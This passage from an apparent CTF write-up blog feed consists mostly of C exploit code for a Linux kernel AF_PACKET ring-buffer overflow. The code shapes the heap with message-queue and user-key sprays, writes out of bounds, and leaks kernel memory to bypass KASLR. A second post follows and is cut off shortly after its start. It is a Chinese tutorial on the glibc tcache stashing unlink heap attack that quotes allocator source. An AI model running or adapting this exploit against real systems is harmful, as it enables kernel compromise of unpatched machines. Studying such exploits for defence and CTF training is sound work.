class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">req.tp_block_size = block_size; <span class="comment">// 0x1000</span></span><br><span class="line">req.tp_frame_size = frame_size;<span class="comment">// 0x1000</span></span><br><span class="line">req.tp_block_nr = block_nr; <span class="comment">// 0x1</span></span><br><span class="line">req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">req.tp_retire_blk_tov = timeout;</span><br><span class="line"><span class="comment">// (1u&lt;&lt;31) + (1u&lt;&lt;30) + 0x8000 - BLK_HDR_LEN - macoff + offset</span></span><br><span class="line">req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vulnerability happens in this system call</span></span><br><span class="line">rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"><span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] setsockopt(PACKET_RX_RING)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line"><span class="comment">// create a AF_PACKET socket</span></span><br><span class="line"><span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line"><span class="keyword">if</span> (s &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] socket(AF_PACKET)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,</span><br><span class="line">sizeof_priv, timeout);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">sa.sll_family = PF_PACKET;</span><br><span class="line">sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line"><span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] bind(AF_PACKET)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_send</span><span class="params">(<span class="type">int</span> s, <span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">sa.sll_halen = ETH_ALEN;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sendto(s, buffer, size, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;sa,</span><br><span class="line"><span class="keyword">sizeof</span>(sa)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] sendto(SOCK_RAW)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loopback_send</span><span class="params">(<span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line"><span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line"><span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] socket(SOCK_RAW)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">packet_socket_send(s, buffer, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_sock_kmalloc</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));</span><br><span class="line"><span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] socket(SOCK_DGRAM)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_sock_timer_schedule</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">packet_socket_rx_ring_init(s, <span class="number">0x1000</span>, <span class="number">0x1000</span>, <span class="number">1</span>, <span class="number">0</span>, timeout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_sock_id_match_trigger</span><span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">16</span>];</span><br><span class="line">packet_socket_send(s, &amp;buffer[<span class="number">0</span>], <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(x, a)__ALIGN_KERNEL((x), (a))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ALIGN_KERNEL(x, a)__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ALIGN_KERNEL_MASK(x, mask)(((x) + (mask)) &amp; ~(mask))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> V3_ALIGNMENT(8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLK_HDR_LEN(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ETH_HDR_LENsizeof(struct ethhdr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IP_HDR_LENsizeof(struct iphdr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UDP_HDR_LENsizeof(struct udphdr)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UDP_HDR_LEN_FULL(ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">oob_setup</span><span class="params">(<span class="type">int</span> offset)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> maclen = ETH_HDR_LEN;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +</span><br><span class="line">(maclen &lt; <span class="number">16</span> ? <span class="number">16</span> : maclen));</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> macoff = netoff - maclen;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sizeof_priv = (<span class="number">1u</span>&lt;&lt;<span class="number">31</span>) + (<span class="number">1u</span>&lt;&lt;<span class="number">30</span>) +</span><br><span class="line"><span class="number">0x8000</span> - BLK_HDR_LEN - macoff + offset;</span><br><span class="line"><span class="keyword">return</span> packet_socket_setup(<span class="number">0x8000</span>, <span class="number">2048</span>, <span class="number">2</span>, sizeof_priv, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">oob_setup_kaslr</span><span class="params">(<span class="type">int</span> offset)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> maclen = ETH_HDR_LEN;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +</span><br><span class="line">(maclen &lt; <span class="number">16</span> ? <span class="number">16</span> : maclen));</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> macoff = netoff - maclen;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sizeof_priv = (<span class="number">1u</span>&lt;&lt;<span class="number">31</span>) + (<span class="number">1u</span>&lt;&lt;<span class="number">30</span>) +</span><br><span class="line"><span class="number">0x1000</span> - BLK_HDR_LEN - macoff + offset;</span><br><span class="line"><span class="keyword">return</span> packet_socket_setup(<span class="number">0x1000</span>, <span class="number">0x200</span>, <span class="number">2</span>, sizeof_priv, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_write</span><span class="params">(<span class="type">char</span> *buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">loopback_send(buffer, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * Heap shaping * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kmalloc_pad</span><span class="params">(<span class="type">int</span> count)</span> &#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">packet_sock_kmalloc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pagealloc_pad</span><span class="params">(<span class="type">int</span> count)</span> &#123;</span><br><span class="line">packet_socket_setup(<span class="number">0x8000</span>, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pagealloc_pad_kaslr</span><span class="params">(<span class="type">int</span> count)</span> &#123;</span><br><span class="line">    <span class="comment">// kmalloc-256 uses 1 page slab</span></span><br><span class="line">packet_socket_setup(<span class="number">0x1000</span>, <span class="number">0x200</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">write_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* file, <span class="type">const</span> <span class="type">char</span>* what, ...)</span> &#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">va_list args;</span><br><span class="line">va_start(args, what);</span><br><span class="line">vsnprintf(buf, <span class="keyword">sizeof</span>(buf), what, args);</span><br><span class="line">va_end(args);</span><br><span class="line">buf[<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (write(fd, buf, len) != len) &#123;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup_sandbox</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> real_uid = getuid();</span><br><span class="line"><span class="type">int</span> real_gid = getgid();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unshare(CLONE_NEWUSER) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unshare(CLONE_NEWNET) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>)) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] write_file(/proc/self/set_groups)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="string">&quot;0 %d 1\\n&quot;</span>, real_uid))&#123;</span><br><span class="line">perror(<span class="string">&quot;[-] write_file(/proc/self/uid_map)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="string">&quot;0 %d 1\\n&quot;</span>, real_gid)) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] write_file(/proc/self/gid_map)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">cpu_set_t</span> my_set;</span><br><span class="line">CPU_ZERO(&amp;my_set);</span><br><span class="line">CPU_SET(<span class="number">0</span>, &amp;my_set);</span><br><span class="line"><span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(my_set), &amp;my_set) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] sched_setaffinity()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (system(<span class="string">&quot;/sbin/ifconfig lo up&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] system(/sbin/ifconfig lo up)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************************ KASLR BYPASS ***********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* spray 256 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">msg_init</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (msqid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> msqid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 200 for 256</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">msg_alloc</span><span class="params">(<span class="type">int</span> msqid, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg</span> *<span class="title">m</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg) + size);</span><br><span class="line">    m-&gt;mtype = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(m-&gt;data, <span class="number">0x41</span>, size);</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msqid, (<span class="type">void</span> *)m, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg)+size, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsnd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(m);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kmalloc_msg</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">    <span class="type">int</span> msqid;</span><br><span class="line">    msqid = msg_init();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;num; i++) &#123;</span><br><span class="line">        <span class="comment">// kmalloc 256</span></span><br><span class="line">        <span class="keyword">if</span> (i%<span class="number">50</span> == <span class="number">0</span>)</span><br><span class="line">            msqid = msg_init();</span><br><span class="line">        msg_alloc(msqid, <span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">key_serial_t</span> <span class="title function_">spray_key</span><span class="params">(<span class="type">size_t</span> size, <span class="type">int</span> i)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">0x18</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;size &lt;= 0x18\\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> type[<span class="number">5</span>] = <span class="string">&quot;user&quot;</span>;</span><br><span class="line"><span class="type">char</span>* description = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">10</span>);</span><br><span class="line"><span class="type">char</span>* payload = (<span class="type">char</span>*)<span class="built_in">malloc</span>(size<span class="number">-0x18</span>); <span class="comment">// 256</span></span><br><span class="line"><span class="built_in">memset</span>(payload, <span class="string">&#x27;B&#x27;</span>, size<span class="number">-0x18</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">key_serial_t</span> key;</span><br><span class="line"><span class="built_in">sprintf</span>(description, <span class="string">&quot;key%d&quot;</span>, i);</span><br><span class="line">key = add_key(type, description, payload, size<span class="number">-0x18</span>, KEY_SPEC_USER_KEYRING);</span><br><span class="line"><span class="keyword">if</span> (key == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;add_key&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">free</span>(description);</span><br><span class="line">    <span class="built_in">free</span>(payload);</span><br><span class="line"><span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">leak_key</span><span class="params">(<span class="type">key_serial_t</span> key, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line"><span class="type">void</span> *data = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">memset</span>(data, <span class="number">0</span>, size);</span><br><span class="line">    <span class="type">int</span> xxx = keyctl_read(key, data, size);</span><br><span class="line"><span class="keyword">if</span> (xxx == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;keyctl_read&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (xxx == <span class="number">0x4444</span>) &#123;</span><br><span class="line"><span class="built_in">free</span>(data);</span><br><span class="line">data = <span class="built_in">malloc</span>(<span class="number">0x4444</span>);</span><br><span class="line"><span class="comment">// leaking `struct key`</span></span><br><span class="line">keyctl_read(key, data, <span class="number">0x4444</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read key: %d\\n&quot;</span>, xxx);</span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">key_serial_t</span> keys[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_user_key</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> s = oob_setup_kaslr(<span class="number">0x2000</span>+<span class="number">0x2e8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line">        keys[i] = spray_key(<span class="number">256</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x300</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buffer+<span class="number">0x18</span><span class="number">-2</span>+<span class="number">0x10</span>, <span class="string">&#x27;D&#x27;</span>, <span class="number">0x110</span>);</span><br><span class="line">buffer[<span class="number">0x26</span>] = <span class="number">0x0</span>;</span><br><span class="line">buffer[<span class="number">0x27</span>] = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prb_open_block</span></span><br><span class="line">    oob_write(buffer, <span class="number">0x40</span>);</span><br><span class="line">    <span class="type">int</span> target = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">        <span class="type">char</span> *data = leak_key(keys[i], <span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">0x500</span><span class="number">-0x10</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(data+j+<span class="number">0x10</span>, <span class="string">&quot;DDBBBBBBBBBBBBBB&quot;</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">                DumpHex(data, <span class="number">0x500</span>);</span><br><span class="line">                target = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;We find it!\\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> found;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%d\\n&quot;</span>, i);</span><br><span class="line">       DumpHex(data, <span class="number">100</span>);</span><br><span class="line"><span class="built_in">free</span>(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Not found\\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line"></span><br><span class="line">found:</span><br><span class="line">    DumpHex(leak_key(keys[target], <span class="number">0x2000</span>), <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[.] starting\\n&quot;</span>);</span><br><span class="line">setup_sandbox();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[.] namespace sandbox set up\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[.] padding heap\\n&quot;</span>);</span><br><span class="line">    kmalloc_msg(<span class="number">0x800</span>);</span><br><span class="line">    pagealloc_pad_kaslr(<span class="number">0x500</span>);</span><br><span class="line">    oob_user_key();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tcache Stashing Unlink Attack 利用</title>
      <link href="/posts/3147857986.html"/>
      <url>/posts/3147857986.html</url>
      
        <content type="html"><![CDATA[<h2 id="House-of-Lore-Attack"><a href="#House-of-Lore-Attack" class="headerlink" title="House of Lore Attack"></a>House of Lore Attack</h2><p>首先我们看一下<code>glibc 2.30</code>中的源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">  idx = smallbin_index (nb);</span><br><span class="line">  bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">      set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">         &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = tc_victim-&gt;bk;</span><br><span class="line">          set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        set_non_main_arena (tc_victim);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从源代码中我们可以看出，如果我们控制了一块<code>small bin</code>的<code>bk</code>指针，就可以向任意的位置写入一个<code>main_arena</code>附近的地址，在<code>small 